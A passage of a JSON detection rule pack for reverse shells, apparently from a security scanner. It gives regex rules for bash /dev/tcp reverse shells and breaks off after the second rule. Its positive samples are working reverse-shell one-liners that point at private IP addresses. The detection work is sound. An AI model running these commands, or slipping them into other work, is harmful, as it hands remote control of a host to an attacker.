{
 "pack": "reverseshells",
 "rules": [
  {
   "id": "byte-revshell-bash-devtcp",
   "name": "Bash /dev/tcp reverse shell",
   "description": "An interactive bash redirected over /dev/tcp to a remote host.",
   "tactic": "Execution",
   "technique": "T1059.004",
   "severity": "critical",
   "weight": 70,
   "applies_to": "both",
   "format": "script",
   "strings": [
    {
     "name": "a",
     "type": "regex",
     "value": "bash\\s+-i\\s*>&?\\s*/dev/tcp/[^/\\s]{3,64}/\\d{1,5}"
    },
    {
     "name": "b",
     "type": "regex",
     "value": "\\d?\\s*<>\\s*/dev/tcp/[^/\\s]{3,64}/\\d{1,5}\\b"
    },
    {
     "name": "c",
     "type": "regex",
     "value": "0>&1|<&\\d|>&\\s*\\d"
    }
   ],
   "condition": {
    "all": [
     {
      "any": [
       {
        "str": "a"
       },
       {
        "str": "b"
       }
      ]
     },
     {
      "str": "c"
     }
    ]
   },
   "samples": {
    "positive": [
     {
      "text": "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"
     }
    ],
    "negative": [
     {
      "text": "bash -i"
     },
     {
      "text": "echo hi > /dev/tcp_log.txt"
     },
     {
      "text": "cat < /dev/tcp"
     }
    ]
   }
  },
  {
   "id": "byte-revshell-devtcp-fd",
   "name": "Bash exec with a /dev/tcp file descriptor",
   "description": "exec N<>/dev/tcp/host/port followed by a shell using the descriptor.",
   "tactic": "Execution",
   "technique": "T1059.004",
   "severity": "critical",
   "weight": 65,
   "applies_to": "both",
   "format": "script",
   "strings": [
    {
     "name": "a",
     "type": "regex",
     "value": "exec\\s+\\d+\\s*<>\\s*/dev/tcp/[^/\\s]{3,64}/\\d{1,5}"
    },
    {
     "name": "b",
     "type": "regex",
     "value": "(?:sh|bash)\\s+(?:-i\\s+)?<&\\d+\\s*>&\\d+"
    }
   ],
   "condition": {
    "all": [
     {
      "str": "a"
     },
     {
      "str": "b"
     }
    ]
   },
   "samples": {
    "positive": [
     {
      "text": "exec 5<>/dev/tcp/192.168.1.9/9001; sh <&5 >&5 2>&5"
     }
    ],
    "negative": [
     {
      "text": "exec 5<>/dev/tcp/192.168.1.9/9001; echo ok >&5"
     },
     {
      "text": "sh <&5 >&5 2>&5"
     }
    ]
   }
  },
  {
